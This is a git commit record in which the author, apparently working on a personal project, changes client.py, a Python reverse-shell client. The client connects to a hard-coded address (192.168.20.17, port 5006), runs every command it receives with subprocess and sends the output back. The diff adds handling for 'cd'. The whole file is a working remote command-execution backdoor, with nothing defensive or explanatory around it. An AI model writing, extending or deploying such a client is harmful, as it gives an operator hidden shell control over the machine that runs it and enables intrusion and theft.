4ce684ddd91883c38cb2a51d0cf9dca9cd2e0f9b
TheStandardPancake <40510902+TheStandardPancake@users.noreply.github.com>
2020-07-19 15:01:54 +1000

    Trying to get cd to work

--- client.py
+++ client.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+import os
 sever = "192.168.20.17"
 port = 5006
 buffer = 1024
@@ -9,6 +10,9 @@ while True:
     command = s.recv(buffer).decode()
     if command.lower() == "quit":
         break
-    output = subprocess.getoutput(command)
-    s.send(output.encode())
+    if command.split()[0] == "cd":
+        os.chdir(command.split()[1])
+    else:
+        output = subprocess.getoutput(command)
+        s.send(output.encode())
 s.close()
